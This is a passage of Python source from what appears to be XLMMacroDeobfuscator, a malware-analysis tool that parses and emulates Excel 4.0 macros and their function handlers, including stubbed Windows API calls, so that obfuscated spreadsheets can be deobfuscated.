import argparse
import base64
import copy
import datetime
import hashlib
import json
import linecache
import math
import msoffcrypto
import operator
import os
import random
import sys
import time
import roman


from enum import Enum
from lark import Lark
from lark.exceptions import ParseError
from lark.lexer import Token
from lark.tree import Tree
from tempfile import mkstemp

from XLMMacroDeobfuscator.__init__ import __version__
from XLMMacroDeobfuscator.configs.settings import SILENT
from XLMMacroDeobfuscator.excel_wrapper import XlApplicationInternational
from XLMMacroDeobfuscator.xlsm_wrapper import XLSMWrapper

try:
    from XLMMacroDeobfuscator.xls_wrapper import XLSWrapper

    HAS_XLSWrapper = True
except:
    HAS_XLSWrapper = False
    if not SILENT:
        print('XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)')

from XLMMacroDeobfuscator.xls_wrapper_2 import XLSWrapper2
from XLMMacroDeobfuscator.xlsb_wrapper import XLSBWrapper
from XLMMacroDeobfuscator.boundsheet import *
from distutils.util import strtobool


class EvalStatus(Enum):
    FullEvaluation = 1
    PartialEvaluation = 2
    Error = 3
    NotImplemented = 4
    End = 5
    Branching = 6
    FullBranching = 7
    IGNORED = 8


class EvalResult:
    def __init__(self, next_cell, status, value, text):
        self.next_cell = next_cell
        self.status = status
        self.value = value
        self.text = None
        self.output_level = 0
        self.set_text(text)

    @staticmethod
    def is_int(text):
        try:
            int(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_float(text):
        try:
            float(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_datetime(text):
        try:
            datetime.datetime.strptime(text, "%Y-%m-%d %H:%M:%S.%f")
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_time(text):
        try:
            datetime.datetime.strptime(text, "%H:%M:%S")
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def unwrap_str_literal(string):
        result = str(string)
        if len(result) > 1 and result.startswith('"') and result.endswith('"'):
            result = result[1:-1].replace('""', '"')
        return result

    @staticmethod
    def wrap_str_literal(data, must_wrap=False):
        result = ''
        if EvalResult.is_float(data) or (len(data) > 1 and data.startswith('"') and data.endswith('"') and must_wrap is False):
            result = str(data)
        elif type(data) is float:
            if data.is_integer():
                data = int(data)
            result = str(data)
        elif type(data) is int or type(data) is bool:
            result = str(data)
        else:
            result = '"{}"'.format(data.replace('"', '""'))
        return result

    def get_text(self, unwrap=False):
        result = ''
        if self.text is not None:

            if self.is_float(self.text):
                self.text = float(self.text)
                if self.text.is_integer():
                    self.text = int(self.text)
                    self.text = str(self.text)

            if unwrap:
                result = self.unwrap_str_literal(self.text)
            else:
                result = str(self.text)

        return result

    def set_text(self, data, wrap=False):
        if data is not None:
            if wrap:
                self.text = self.wrap_str_literal(data)
            else:
                self.text = str(data)


class XLMInterpreter:
    def __init__(self, xlm_wrapper, output_level=0):
        self.xlm_wrapper = xlm_wrapper
        self._formula_cache = {}
        self.cell_addr_regex_str = r"((?P<sheetname>[^\s]+?|'.+?')!)?\$?(?P<column>[a-zA-Z]+)\$?(?P<row>\d+)"
        self.cell_addr_regex = re.compile(self.cell_addr_regex_str)
        self.xlm_parser = self.get_parser()
        self.defined_names = self.xlm_wrapper.get_defined_names()
        self.auto_labels = None
        self._branch_stack = []
        self._while_stack = []
        self._for_iterators = {}
        self._function_call_stack = []
        self._memory = []
        self._files = {}
        self._registered_functions = {}
        self._workspace_defaults = {}
        self._window_defaults = {}
        self._cell_defaults = {}
        self._expr_rule_names = ['expression', 'concat_expression', 'additive_expression', 'multiplicative_expression']
        self._operators = {'+': operator.add, '-': operator.sub, '*': operator.mul, '/': operator.truediv,
                           '>': operator.gt, '<': operator.lt, '<>': operator.ne, '=': operator.eq, '>=': operator.ge,
                           '<=': operator.le}
        self._indent_level = 0
        self._indent_current_line = False
        self.day_of_month = None
        self.invoke_interpreter = False
        self.first_unknown_cell = None
        self.cell_with_unsuccessfull_set = set()
        self.selected_range = None
        self.active_cell = None
        self.ignore_processing = False
        self.next_count = 0
        self.char_error_count = 0
        self.output_level = output_level
        self._remove_current_formula_from_cache = False
        self._start_timestamp = time.time()
        self._iserror_count = 0
        self._iserror_loc = None
        self._iserror_val = False
        self._now_count = 0
        self._now_step = 2

        self._handlers = {
            # methods
            'END.IF': self.end_if_handler,
            'FORMULA.FILL': self.formula_fill_handler,
            'FORMULA.ARRAY': self.formula_array_handler,
            'GET.CELL': self.get_cell_handler,
            'GET.DOCUMENT': self.get_document_handler,
            'GET.WINDOW': self.get_window_handler,
            'GET.WORKSPACE': self.get_workspace_handler,
            'ON.TIME': self.on_time_handler,
            'SET.VALUE': self.set_value_handler,
            'SET.NAME': self.set_name_handler,
            'ACTIVE.CELL': self.active_cell_handler,
            'APP.MAXIMIZE': self.app_maximize_handler,

            # functions
            'ABS': self.abs_handler,
            'ABSREF': self.absref_handler,
            'ADDRESS': self.address_handler,
            'AND': self.and_handler,
            'CALL': self.call_handler,
            'CHAR': self.char_handler,
            'CLOSE': self.halt_handler,
            'CODE': self.code_handler,
            'CONCATENATE': self.concatenate_handler,
            'COUNTA': self.counta_handler,
            'COUNT': self.count_handler,
            'DAY': self.day_handler,
            'DEFINE.NAME': self.define_name_handler,
            'DIRECTORY': self.directory_handler,
            'ERROR': self.error_handler,
            'FILES': self.files_handler,
            'FORMULA': self.formula_handler,
            'FOPEN': self.fopen_handler,
            'FOR.CELL': self.forcell_handler,
            'FSIZE': self.fsize_handler,
            'FWRITE': self.fwrite_handler,
            'FWRITELN': self.fwriteln_handler,
            'GOTO': self.goto_handler,
            'HALT': self.halt_handler,
            'INDEX': self.index_handler,
            'HLOOKUP': self.hlookup_handler,
            'IF': self.if_handler,
            'INDIRECT': self.indirect_handler,
            'INT': self.int_handler,
            'ISERROR': self.iserror_handler,
            'ISNUMBER': self.is_number_handler,
            'LEN': self.len_handler,
            'MAX': self.max_handler,
            'MIN': self.min_handler,
            'MOD': self.mod_handler,
            'MID': self.mid_handler,
            'SQRT': self.sqrt_handler,
            'NEXT': self.next_handler,
            'NOT': self.not_handler,
            'NOW': self.now_handler,
            'OR': self.or_handler,
            'OFFSET': self.offset_handler,
            'PRODUCT': self.product_handler,
            'QUOTIENT': self.quotient_handler,
            'RANDBETWEEN': self.randbetween_handler,
            'REGISTER': self.register_handler,
            'REGISTER.ID': self.registerid_handler,
            'RETURN': self.return_handler,
            'ROUND': self.round_handler,
            'ROUNDUP': self.roundup_handler,
            'RUN': self.run_handler,
            'ROWS': self.rows_handler,
            'SEARCH': self.search_handler,
            'SELECT': self.select_handler,
            'SUM': self.sum_handler,
            'T': self.t_handler,
            'TEXT': self.text_handler,
            'TRUNC': self.trunc_handler,
            'VALUE': self.value_handler,
            'WHILE': self.while_handler,

            # Windows API
            'Kernel32.VirtualAlloc': self.VirtualAlloc_handler,
            'Kernel32.WriteProcessMemory': self.WriteProcessMemory_handler,
            'Kernel32.RtlCopyMemory': self.RtlCopyMemory_handler,

            # Future fuctions
            '_xlfn.ARABIC': self.arabic_hander,
        }

    MAX_ISERROR_LOOPCOUNT = 10

    jump_functions = ('GOTO', 'RUN')
    important_functions = ('CALL', 'FOPEN', 'FWRITE', 'FREAD', 'REGISTER', 'IF', 'WHILE', 'HALT', 'CLOSE', "NEXT")
    important_methods = ('SET.VALUE', 'FILE.DELETE', 'WORKBOOK.HIDE')

    unicode_to_latin1_map = {
        8364: 128,
        129: 129,
        8218: 130,
        402: 131,
        8222: 132,
        8230: 133,
        8224: 134,
        8225: 135,
        710: 136,
        8240: 137,
        352: 138,
        8249: 139,
        338: 140,
        141: 141,
        381: 142,
        143: 143,
        144: 144,
        8216: 145,
        8217: 146,
        8220: 147,
        8221: 148,
        8226: 149,
        8211: 150,
        8212: 151,
        732: 152,
        8482: 153,
        353: 154,
        8250: 155,
        339: 156,
        157: 157,
        382: 158,
        376: 159
    }

    def __copy__(self):
        result = XLMInterpreter(self.xlm_wrapper)
        result.auto_labels = self.auto_labels
        result._workspace_defaults = self._workspace_defaults
        result._window_defaults = self._window_defaults
        result._cell_defaults = self._cell_defaults
        result._formula_cache = self._formula_cache

        return result

    @staticmethod
    def is_float(text):
        try:
            float(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_int(text):
        try:
            int(text)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def is_bool(text):
        try:
            strtobool(text)
            return True
        except (ValueError, TypeError, AttributeError):
            return False

    def convert_float(self, text):
        result = None
        text = text.lower()
        if text == 'false':
            result = 0
        elif text == 'true':
            result = 1
        else:
            result = float(text)
        return result

    def get_parser(self):
        xlm_parser = None
        grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro.lark.template')
        with open(grammar_file_path, 'r', encoding='utf_8') as grammar_file:
            macro_grammar = grammar_file.read()
            macro_grammar = macro_grammar.replace('{{XLLEFTBRACKET}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlLeftBracket))
            macro_grammar = macro_grammar.replace('{{XLRIGHTBRACKET}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlRightBracket))
            macro_grammar = macro_grammar.replace('{{XLLISTSEPARATOR}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlListSeparator))
            xlm_parser = Lark(macro_grammar, parser='lalr')

        return xlm_parser

    def get_formula_cell(self, macrosheet, col, row):
        result_cell = None
        not_found = False
        row = int(row)
        current_row = row
        current_addr = col + str(current_row)
        while current_addr not in macrosheet.cells or \
                macrosheet.cells[current_addr].formula is None:
            if (current_row - row) < 10000:
                current_row += 1
            else:
                not_found = True
                break
            current_addr = col + str(current_row)

        if not_found is False:
            result_cell = macrosheet.cells[current_addr]

        return result_cell

    def get_range_parts(self, parse_tree):
        if isinstance(parse_tree, Tree) and parse_tree.data == 'range':
            return parse_tree.children[0], parse_tree.children[-1]
        else:
            return None, None

    def get_cell_addr(self, current_cell, cell_parse_tree):

        res_sheet = res_col = res_row = None
        if type(cell_parse_tree) is Token:
            names = self.xlm_wrapper.get_defined_names()

            label = cell_parse_tree.value.lower()
            if label in names:
                name_val = names[label]
                if isinstance(name_val, Tree):
                    # example: 6a8045bc617df5f2b8f9325ed291ef05ac027144f1fda84e78d5084d26847902
                    res_sheet, res_col, res_row = self.get_cell_addr(current_cell, name_val)
                else:
                    res_sheet, res_col, res_row = Cell.parse_cell_addr(name_val)
            elif label.strip('"') in names:
                res_sheet, res_col, res_row = Cell.parse_cell_addr(names[label.strip('"')])
            else:

                if len(label) > 1 and label.startswith('"') and label.endswith('"'):
                    label = label.strip('"')
                    root_parse_tree = self.xlm_parser.parse('=' + label)
                    res_sheet, res_col, res_row = self.get_cell_addr(current_cell, root_parse_tree.children[0])
        else:
            if cell_parse_tree.data == 'defined_name':
                label = '{}'.format(cell_parse_tree.children[2])
                formula_str = self.xlm_wrapper.get_defined_name(label)
                parsed_tree = self.xlm_parser.parse('=' + formula_str)
                if isinstance(parsed_tree.children[0], Tree) and parsed_tree.children[0].data == 'range':
                    start_cell, end_cell = self.get_range_parts(parsed_tree.children[0])
                    cell = start_cell.children[0]
                else:
                    cell = parsed_tree.children[0].children[0]
            else:
                cell = cell_parse_tree.children[0]

            if cell.data == 'a1_notation_cell':
                if len(cell.children) == 2:
                    cell_addr = "'{}'!{}".format(cell.children[0], cell.children[1])
                else:
                    cell_addr = cell.children[0]
                res_sheet, res_col, res_row = Cell.parse_cell_addr(cell_addr)

                if res_sheet is None and res_col is not None:
                    res_sheet = current_cell.sheet.name
            elif cell.data == 'r1c1_notation_cell':
                current_col = Cell.convert_to_column_index(current_cell.column)
                current_row = int(current_cell.row)

                for current_child in cell.children:
                    if current_child.type == 'NAME':
                        res_sheet = current_child.value
                    elif self.is_float(current_child.value):
                        val = int(float(current_child.value))
                        if last_seen == 'r':
                            res_row = val
                        else:
                            res_col = val
                    elif current_child.value.startswith('['):
                        val = int(current_child.value[1:-1])
                        if last_seen == 'r':
                            res_row = current_row + val
                        else:
                            res_col = current_col + val
                    elif current_child.lower() == 'r':
                        last_seen = 'r'
                        res_row = current_row
                    elif current_child.lower() == 'c':
                        last_seen = 'c'
                        res_col = current_col
                    else:
                        raise Exception('Cell addresss, Syntax Error')

                if res_sheet is None:
                    res_sheet = current_cell.sheet.name
                res_row = str(res_row)
                res_col = Cell.convert_to_column_name(res_col)
            else:
                raise Exception('Cell addresss, Syntax Error')

        return res_sheet, res_col, res_row

    def get_cell(self, sheet_name, col, row):
        result = None
        sheets = self.xlm_wrapper.get_macrosheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr in sheet.cells:
                result = sheet.cells[addr]
        else:
            sheets = self.xlm_wrapper.get_worksheets()
            if sheet_name in sheets:
                sheet = sheets[sheet_name]
                addr = col + str(row)
                if addr in sheet.cells:
                    result = sheet.cells[addr]

        return result

    def get_worksheet_cell(self, sheet_name, col, row):
        result = None
        sheets = self.xlm_wrapper.get_worksheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr in sheet.cells:
                result = sheet.cells[addr]

        return result

    def set_cell(self, sheet_name, col, row, text, set_value_only=False):
        sheets = self.xlm_wrapper.get_macrosheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr not in sheet.cells:
                new_cell = Cell()
                new_cell.column = col
                new_cell.row = row
                new_cell.sheet = sheet
                sheet.cells[addr] = new_cell

            cell = sheet.cells[addr]

            text = EvalResult.unwrap_str_literal(text)

            if not set_value_only:
                if text.startswith('='):
                    cell.formula = text
                else:
                    cell.formula = None

            cell.value = text

    @staticmethod
    def convert_ptree_to_str(parse_tree_root):
        if type(parse_tree_root) == Token:
            return str(parse_tree_root)
        else:
            result = ''
            for child in parse_tree_root.children:
                result += XLMInterpreter.convert_ptree_to_str(child)
            return result

    def get_window(self, number):
        result = None
        if len(self._window_defaults) == 0:
            script_dir = os.path.dirname(__file__)
            config_dir = os.path.join(script_dir, 'configs')
            with open(os.path.join(config_dir, 'get_window.conf'), 'r', encoding='utf_8') as workspace_conf_file:
                for index, line in enumerate(workspace_conf_file):
                    line = line.strip()
                    if len(line) > 0:
                        if self.is_float(line) is True:
                            self._window_defaults[index + 1] = int(float(line))
                        else:
                            self._window_defaults[index + 1] = line

        if number in self._window_defaults:
            result = self._window_defaults[number]

        return result

    def get_workspace(self, number):
        result = None
        if len(self._workspace_defaults) == 0:
            script_dir = os.path.dirname(__file__)
            config_dir = os.path.join(script_dir, 'configs')
            with open(os.path.join(config_dir, 'get_workspace.conf'), 'r', encoding='utf_8') as workspace_conf_file:
                for index, line in enumerate(workspace_conf_file):
                    line = line.strip()
                    if len(line) > 0:
                        self._workspace_defaults[index + 1] = line

        if number in self._workspace_defaults:
            result = self._workspace_defaults[number]
        return result

    def get_default_cell_info(self, number):
        result = None
        if len(self._cell_defaults) == 0:
            script_dir = os.path.dirname(__file__)
            config_dir = os.path.join(script_dir, 'configs')
            with open(os.path.join(config_dir, 'get_cell.conf'), 'r', encoding='utf_8') as workspace_conf_file:
                for index, line in enumerate(workspace_conf_file):
                    line = line.strip()
                    if len(line) > 0:
                        self._cell_defaults[index + 1] = line

        if number in self._cell_defaults:
            result = self._cell_defaults[number]
        return result

    def evaluate_formula(self, current_cell, name, arguments, interactive, destination_arg=1, set_value_only=False):
        # hash: fa391403aa028fa7b42a9f3491908f6f25414c35bfd104f8cf186220fb3b4f83" --> =FORMULA()
        if isinstance(arguments[0], list) and len(arguments[0]) == 0:
            return EvalResult(None, EvalStatus.FullEvaluation, False, "{}()".format(name))
        source, destination = (arguments[0], arguments[1]) if destination_arg == 1 else (arguments[1], arguments[0])

        src_eval_result = self.evaluate_parse_tree(current_cell, source, interactive)

        if isinstance(destination, Token):
            # TODO: get_defined_name must return a list; currently it returns list or one item

            destination = self.xlm_wrapper.get_defined_name(destination)
            if isinstance(destination, list):
                destination = [] if not destination else destination[0]

        if(isinstance(destination, str)):
            destination = self.xlm_parser.parse('=' + destination).children[0]

        if isinstance(destination, Tree):
            if destination.data == 'defined_name' or destination.data == 'name':
                defined_name_formula = self.xlm_wrapper.get_defined_name(destination.children[2])
                if isinstance(defined_name_formula, Tree):
                    destination = defined_name_formula
                else:
                    destination = self.xlm_parser.parse('=' + defined_name_formula).children[0]

            if destination.data == 'concat_expression' or destination.data == 'function_call':
                res = self.evaluate_parse_tree(current_cell, destination, interactive)
                if isinstance(res.value, tuple) and len(res.value) == 3:
                    destination_str = "'{}'!{}{}".format(res.value[0], res.value[1], res.value[2])
                    dst_start_sheet, dst_start_col, dst_start_row = res.value
                else:
                    destination_str = res.text
                    dst_start_sheet, dst_start_col, dst_start_row = Cell.parse_cell_addr(destination_str)
                dst_end_sheet, dst_end_col, dst_end_row = dst_start_sheet, dst_start_col, dst_start_row

            else:
                if destination.data == 'range':
                    dst_start_sheet, dst_start_col, dst_start_row = self.get_cell_addr(current_cell,
                                                                                       destination.children[0])
                    dst_end_sheet, dst_end_col, dst_end_row = self.get_cell_addr(current_cell, destination.children[2])
                else:
                    dst_start_sheet, dst_start_col, dst_start_row = self.get_cell_addr(current_cell, destination)
                    dst_end_sheet, dst_end_col, dst_end_row = dst_start_sheet, dst_start_col, dst_start_row
                destination_str = XLMInterpreter.convert_ptree_to_str(destination)


        text = src_eval_result.get_text(unwrap=True)
        if src_eval_result.status == EvalStatus.FullEvaluation:
            for row in range(int(dst_start_row), int(dst_end_row) + 1):
                for col in range(Cell.convert_to_column_index(dst_start_col),
                                 Cell.convert_to_column_index(dst_end_col) + 1):
                    if (
                            dst_start_sheet,
                            Cell.convert_to_column_name(col) + str(row)) in self.cell_with_unsuccessfull_set:
                        self.cell_with_unsuccessfull_set.remove((dst_start_sheet,
                                                                 Cell.convert_to_column_name(col) + str(row)))

                    self.set_cell(dst_start_sheet,
                                  Cell.convert_to_column_name(col),
                                  str(row),
                                  str(src_eval_result.value),
                                  set_value_only)
        else:
            for row in range(int(dst_start_row), int(dst_end_row) + 1):
                for col in range(Cell.convert_to_column_index(dst_start_col),
                                 Cell.convert_to_column_index(dst_end_col) + 1):
                    self.cell_with_unsuccessfull_set.add((dst_start_sheet,
                                                          Cell.convert_to_column_name(col) + str(row)))

        if destination_arg == 1:
            text = "{}({},{})".format(name,
                                      src_eval_result.get_text(),
                                      destination_str)
        else:
            text = "{}({},{})".format(name,
                                      destination_str,
                                      src_eval_result.get_text())
        return_val = 0
        return EvalResult(None, src_eval_result.status, return_val, text)

    def evaluate_argument_list(self, current_cell, name, arguments):
        args_str = ''
        for argument in arguments:
            if type(argument) is Token or type(argument) is Tree:
                arg_eval_Result = self.evaluate_parse_tree(current_cell, argument, False)
                args_str += arg_eval_Result.get_text() + ','

        args_str = args_str.strip(',')
        return_val = text = '={}({})'.format(name, args_str)
        status = EvalStatus.PartialEvaluation

        return EvalResult(None, status, return_val, text)

    def evaluate_function(self, current_cell, parse_tree_root, interactive):
        # function name can be a string literal (double quoted or unqouted), and Tree (defined name, cell, function_call)

        function_name = parse_tree_root.children[0]
        function_name_literal = EvalResult.unwrap_str_literal(function_name)

        # OFFSET()()
        if isinstance(function_name, Tree) and function_name.data == 'function_call':
            func_eval_result = self.evaluate_parse_tree(current_cell, function_name, False)
            if func_eval_result.status != EvalStatus.FullEvaluation:
                return EvalResult(func_eval_result.next_cell, func_eval_result.status, 0,
                                  XLMInterpreter.convert_ptree_to_str(parse_tree_root))
            else:
                func_eval_result.text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                return func_eval_result

        # handle alias name for a function (REGISTER)
        # c45ed3a0ce5df27ac29e0fab99dc4d462f61a0d0c025e9161ced3b2c913d57d8
        if function_name_literal in self._registered_functions:
            parse_tree_root.children[0] = parse_tree_root.children[0].update(
                None, self._registered_functions[function_name_literal]['name'])
            return self.evaluate_function(current_cell, parse_tree_root, interactive)

        # cell_function_call
        if isinstance(function_name, Tree) and function_name.data == 'cell':
            self._function_call_stack.append(current_cell)
            return self.goto_handler([function_name], current_cell, interactive, parse_tree_root)

        # test()
        if function_name_literal.lower() in self.defined_names:
            try:
                ref_parsed = self.xlm_parser.parse('=' + self.defined_names[function_name_literal.lower()])
                if isinstance(ref_parsed.children[0], Tree) and ref_parsed.children[0].data == 'cell':
                    function_name = ref_parsed.children[0]
                else:
                    raise Exception
            except:
                function_name = self.defined_names[function_name_literal.lower()]

        # x!test()
        if isinstance(function_name, Tree) and function_name.data == 'defined_name':
            function_lable = function_name.children[-1].value
            if function_lable.lower() in self.defined_names:
                try:
                    ref_parsed = self.xlm_parser.parse('=' + self.defined_names[function_lable.lower()])
                    if isinstance(ref_parsed.children[0], Tree) and ref_parsed.children[0].data == 'cell':
                        function_name = ref_parsed.children[0]
                    else:
                        raise Exception
                except:
                    function_name = self.defined_names[function_name_literal.lower()]

        # cell_function_call
        if isinstance(function_name, Tree) and function_name.data == 'cell':
            self._function_call_stack.append(current_cell)
            return self.goto_handler([function_name], current_cell, interactive, parse_tree_root)

        if self.ignore_processing and function_name_literal != 'NEXT':
            return EvalResult(None, EvalStatus.IGNORED, 0, '')

        arguments = []
        for i in parse_tree_root.children[2].children:
            if type(i) is not Token:
                if len(i.children) > 0:
                    arguments.append(i.children[0])
                else:
                    arguments.append(i.children)

        if function_name_literal in self._handlers:
            eval_result = self._handlers[function_name_literal](arguments, current_cell, interactive, parse_tree_root)

        else:
            eval_result = self.evaluate_argument_list(current_cell, function_name_literal, arguments)

        if function_name_literal in XLMInterpreter.jump_functions:
            eval_result.output_level = 0
        elif function_name_literal in XLMInterpreter.important_functions:
            eval_result.output_level = 2
        else:
            eval_result.output_level = 1

        return eval_result

    # region Handlers
    def and_handler(self, arguments, current_cell, interactive, parse_tree_root):
        value = True
        status = EvalStatus.FullEvaluation
        for arg in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arg, interactive)
            if arg_eval_result.status == EvalStatus.FullEvaluation:
                if EvalResult.unwrap_str_literal(str(arg_eval_result.value)).lower() != "true":
                    value = False
                    break
            else:
                status = EvalStatus.PartialEvaluation
                value = False
                break
        return EvalResult(None, status, value, str(value))

    def or_handler(self, arguments, current_cell, interactive, parse_tree_root):
        value = False
        status = EvalStatus.FullEvaluation
        for arg in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arg, interactive)
            if arg_eval_result.status == EvalStatus.FullEvaluation:
                if EvalResult.unwrap_str_literal(str(arg_eval_result.value)).lower() == "true":
                    value = True
                    break
            else:
                status = EvalStatus.PartialEvaluation
                break

        return EvalResult(None, status, value, str(value))

    def hlookup_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.FullEvaluation
        value = ""
        arg_eval_result1 = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg_eval_result2 = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        arg_eval_result3 = self.evaluate_parse_tree(current_cell, arguments[2], interactive)
        arg_eval_result4 = self.evaluate_parse_tree(current_cell, arguments[3], interactive)
        regex = arg_eval_result1.text.strip('"')
        if regex == '*':
            regex = ".*"
        if arg_eval_result4.value == "FALSE":
            sheet_name, startcolumn, startrow, endcolumn, endrow = Cell.parse_range_addr(arg_eval_result2.text)
            status = EvalStatus.FullEvaluation

            start_col_index = Cell.convert_to_column_index(startcolumn)
            end_col_index = Cell.convert_to_column_index(endcolumn)

            start_row_index = int(startrow) + int(arg_eval_result3.value) - 1
            end_row_index = int(endrow)

            for row in range(start_row_index, end_row_index + 1):
                for col in range(start_col_index, end_col_index + 1):
                    if (sheet_name != None):
                        cell = self.get_worksheet_cell(sheet_name,
                                                       Cell.convert_to_column_name(col),
                                                       str(row))
                    else:
                        cell = self.get_cell(current_cell.sheet.name,
                                             Cell.convert_to_column_name(col),
                                             str(row))

                    if cell and re.match(regex, cell.value):
                        return EvalResult(None, status, cell.value, str(cell.value))
        else:
            status = EvalStatus.PartialEvaluation

        return EvalResult(None, status, value, str(value))

    def not_handler(self, arguments, current_cell, interactive, parse_tree_root):
        value = True
        status = EvalStatus.FullEvaluation
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if arg_eval_result.status == EvalStatus.FullEvaluation:
            if EvalResult.unwrap_str_literal(str(arg_eval_result.value)).lower() == "true":
                value = False
        else:
            status = EvalStatus.PartialEvaluation
        return EvalResult(None, status, value, str(value))

    def code_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.FullEvaluation
        value = 0
        arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        if arg_eval_result.status == EvalStatus.FullEvaluation:
            if arg_eval_result.text != '':
                value = ord(arg_eval_result.text[0])
                if value > 256 and value in XLMInterpreter.unicode_to_latin1_map:
                    value = XLMInterpreter.unicode_to_latin1_map[value]

        else:
            status = EvalStatus.PartialEvaluation
        return EvalResult(None, status, value, str(value))

    def sum_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.FullEvaluation
        value = 0
        it = 0
        for arg in arguments:
            arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[it], interactive)
            value = value + float(arg_eval_result.value)
            status = arg_eval_result.status
            it = it + 1

        return EvalResult(None, status, value, str(value))

    def randbetween_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result1 = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg_eval_result2 = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        value = 0
        # Initial implementation for integer
        if arg_eval_result1.status == EvalStatus.FullEvaluation and arg_eval_result2.status == EvalStatus.FullEvaluation:
            status = EvalStatus.FullEvaluation
            value = random.randint(int(float(arg_eval_result1.value)), int(float(arg_eval_result2.value)))

        return EvalResult(None, status, value, str(value))

    def text_handler(self, arguments, current_cell, interactive, parse_tree_root):
        arg_eval_result1 = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
        arg_eval_result2 = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
        value = 0
        status = EvalStatus.PartialEvaluation
        # Initial implementation for integer
        if arg_eval_result1.status == EvalStatus.FullEvaluation and int(arg_eval_result2.text.strip('\"')) == 0:
            status = EvalStatus.FullEvaluation
            value = int(arg_eval_result1.value)

        return EvalResult(None, status, value, str(value))

    def active_cell_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        if self.active_cell:
            if self.active_cell.formula:
                parse_tree = self.xlm_parser.parse(self.active_cell.formula)
                eval_res = self.evaluate_parse_tree(current_cell, parse_tree, interactive)
                val = eval_res.value
                status = eval_res.status
            else:
                val = self.active_cell.value
                status = EvalStatus.FullEvaluation

            return_val = val
            text = str(return_val)
        else:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            return_val = text

        return EvalResult(None, status, return_val, text)

    def get_cell_handler(self, arguments, current_cell, interactive, parse_tree_root):
        if len(arguments) == 2:
            arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
            dst_sheet, dst_col, dst_row = self.get_cell_addr(current_cell, arguments[1])
            type_id = arg1_eval_result.value
            if self.is_float(type_id):
                type_id = int(float(type_id))
            if dst_sheet is None:
                dst_sheet = current_cell.sheet.name
            status = EvalStatus.PartialEvaluation
            if arg1_eval_result.status == EvalStatus.FullEvaluation:
                data, not_exist, not_implemented = self.xlm_wrapper.get_cell_info(dst_sheet, dst_col, dst_row, type_id)
                if not_exist and 1 == 2:
                    return_val = self.get_default_cell_info(type_id)
                    text = str(return_val)
                    status = EvalStatus.FullEvaluation
                elif not_implemented:
                    text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                    return_val = ''
                else:
                    text = str(data) if data is not None else None
                    return_val = data
                    status = EvalStatus.FullEvaluation
        else:
            text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
            return_val = ''
            status = EvalStatus.PartialEvaluation
        return EvalResult(None, status, return_val, text)

    def set_name_handler(self, arguments, current_cell, interactive, parse_tree_root):
        label = EvalResult.unwrap_str_literal(XLMInterpreter.convert_ptree_to_str(arguments[0])).lower()
        if isinstance(arguments[1], Tree) and arguments[1].data == 'cell':
            arg2_text = XLMInterpreter.convert_ptree_to_str(arguments[1])
            names = self.xlm_wrapper.get_defined_names()
            names[label] = arguments[1]
            text = 'SET.NAME({},{})'.format(label, arg2_text)
            return_val = 0
            status = EvalStatus.FullEvaluation
        else:
            arg2_eval_result = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
            if arg2_eval_result.status is EvalStatus.FullEvaluation:
                arg2_text = arg2_eval_result.get_text(unwrap=True)
                names = self.xlm_wrapper.get_defined_names()
                if isinstance(arg2_eval_result.value, Cell):
                    names[label] = arg2_eval_result.value
                else:
                    names[label] = arg2_text
                text = 'SET.NAME({},{})'.format(label, arg2_text)
                return_val = 0
                status = EvalStatus.FullEvaluation
            else:
                return_val = text = XLMInterpreter.convert_ptree_to_str(parse_tree_root)
                status = arg2_eval_result.status

        return EvalResult(None, status, return_val, text)

    def end_if_handler(self, arguments, current_cell, interactive, parse_tree_root):
        self._indent_level -= 1
        self._indent_current_line = True
        status = EvalStatus.FullEvaluation

        return EvalResult(None, status, 'END.IF', 'END.IF')

    def get_workspace_handler(self, arguments, current_cell, interactive, parse_tree_root):
        status = EvalStatus.PartialEvaluation
        if len(arguments) == 1:
            arg1_eval_Result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)

            if arg1_eval_Result.status == EvalStatus.FullEvaluation and self.is_float(arg1_eval_Result.get_text()):
                workspace_param = self.get_workspace(int(float(arg1_eval_Result.get_text())))
                # current_cell.value = workspace_param
                text = 'GET.WORKSPACE({})'.format(arg1_eval_Result.get_text())
                return_val = workspace_param
                status = EvalStatus.FullEvaluation
                next_cell = None

        if status == EvalStatus.PartialEvaluation:
